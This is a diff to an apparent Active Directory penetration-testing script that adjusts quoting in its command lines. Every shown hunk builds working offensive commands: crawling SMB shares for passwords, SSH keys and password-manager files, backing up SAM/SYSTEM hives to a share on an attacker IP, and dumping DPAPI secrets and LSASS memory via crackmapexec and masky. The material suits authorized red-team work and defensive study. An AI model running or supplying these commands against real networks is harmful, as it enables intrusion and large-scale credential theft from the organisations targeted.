@@ -1078,7 +1078,7 @@ ldeep_enum () {
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] ldeep does not support kerberos authentication${NC}"
             else
-                command="${ldeep} ldap ${argument_ldeep} -s ldap://\"${target}\" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}"
+                command="${ldeep} ldap ${argument_ldeep} -s ldap://${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}"
                 echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
                 $command 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
             fi
@@ -1413,7 +1413,7 @@ spider_cme () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M spider_plus -o OUTPUT=\"${output_dir}/Shares/cme_spider_plus\" EXCLUDE_DIR=\"prnproc$,IPC$,print$,SYSVOL,NETLOGON\" --log ${output_dir}/Shares/cme_spider_output${dc_domain}.txt"
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M spider_plus -o OUTPUT=${output_dir}/Shares/cme_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/cme_spider_output${dc_domain}.txt"
     echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
     $command 2>&1
     echo -e ""
@@ -1443,27 +1443,27 @@ manspider_scan () {
     else
         smb_scan
         echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
-        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f \"passw\" \"user\" \"admin\" \"account\" \"network\" \"login\" \"key\" \"logon\" \"cred\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for SSH keys${NC}"
-        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"ppk\" \"rsa\" \"pem\" \"ssh\" \"rsa\" -o -f \"id_rsa\" \"id_dsa\" \"id_ed25519\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
-        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"bat\" \"com\" \"vbs\" \"ps1\" \"psd1\" \"psm1\" \"pem\" \"key\" \"rsa\" \"pub\" \"reg\" \"txt\" \"cfg\" \"conf\" \"config\" \"xml\" \"cspkg\" \"publishsettings\" \"json\" \"cnf\" \"sql\" \"cmd\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for Password manager files${NC}"
-        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e \"kdbx\" \"kdb\" \"1pif\" \"agilekeychain\" \"opvault\" \"lpd\" \"dashlane\" \"psafe3\" \"enpass\" \"bwdb\" \"msecure\" \"stickypass\" \"pwm\" \"rdb\" \"safe\" \"zps\" \"pmvault\" \"mywallet\" \"jpass\" \"pwmdb\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
-        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c \"passw\" \"login\" -e \"docx\" \"xlsx\" \"xls\" \"pdf\" \"pptx\" \"csv\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
-        command="${manspider} ${output_dir}/Shares/manspiderDump -q -t 100 -c \"passw\" \"key\" \"login\" -l ${output_dir}/Shares/manspiderDump"
+        command="${manspider} ${output_dir}/Shares/manspiderDump -q -t 100 -c passw key login -l ${output_dir}/Shares/manspiderDump"
         echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
         $command 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
         echo -e ""
@@ -1716,14 +1716,14 @@ mssql_enum () {
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
         if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
-            command="${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter \"(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))\" --attrs dNSHostName | grep dNSHostName | cut -d \" \" -f 2 | sort -u  >> ${sql_hostname_list}"
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u  >> ${sql_hostname_list}"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
-            eval "$command"
+            eval $command
         fi
         if [ "${nullsess_bool}" == false ]; then
-            command="${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} | grep \"MSSQLSvc\" | cut -d \"/\" -f 2 | cut -d \":\" -f 1 | cut -d \" \" -f 1 | sort -u >> ${sql_hostname_list}"
+            command="${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} | grep MSSQLSvc | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u >> ${sql_hostname_list}"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
-            eval "$command"
+            eval $command
 
         fi
         for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
@@ -1871,7 +1871,7 @@ samsystem_dump () {
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p ${output_dir}/Credentials/SAMDump/${i}
-                command="${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o \"\\\\$attacker_IP\\lwpshare\\SAMDump\\$i\""
+                command="${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i"
                 echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
                 $command | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
             done
@@ -2025,10 +2025,10 @@ dpapi_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using crackmapexec ${NC}"
-            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi \"cookies\" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
             $command
-            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi \"password\" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi password --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
             $command
         done
@@ -2084,9 +2084,9 @@ masky_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
-            command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain}"
+            command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt"
             echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
-            $command > ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt
+            $command 2>&1
         fi
         pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4| cut -d " " -f 2 | head -n 1)
         pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | head -n 1)
@@ -2098,7 +2098,7 @@ masky_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M masky -o \"CA= ${pki_server}\\${pki_ca}\" --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt"
+                command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt"
                 echo "$(date +%Y-%m-%d\ %H:%M:%S); $command" >> $command_log
                 $command
             done
